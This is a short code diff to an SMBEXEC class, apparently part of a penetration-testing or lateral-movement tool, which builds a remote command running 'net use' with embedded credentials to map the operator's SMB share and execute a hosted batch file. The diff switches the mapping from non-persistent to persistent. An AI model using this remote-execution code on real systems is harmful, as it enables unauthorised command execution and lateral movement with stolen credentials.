@@ -110,11 +110,11 @@ class SMBEXEC:
         with open((cfg.TMP_PATH / self.__batchFile), 'w') as batch_file:
             batch_file.write(command)
 
-        logging.debug('Hosting batch file({}) containing:\n {}'.format(str(cfg.TMP_PATH / self.__batchFile), command))
+        logging.debug('Hosting batch file({}) containing:\n{}'.format(str(cfg.TMP_PATH / self.__batchFile), command))
 
         command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__batchFile)
         #adding creds gets past systems disallowing guest-auth
-        command = self.__shell + '"net use /persistent:no \\\\{}\\{} /user:{} {} & {} "'.format(local_ip, self.__share_name, self.__username, self.__password, command)
+        command = self.__shell + '"net use /persistent:yes \\\\{}\\{} /user:{} {} & {} "'.format(local_ip, self.__share_name, self.__username, self.__password, command)
         
         logging.debug('Command to execute: ' + command)
 
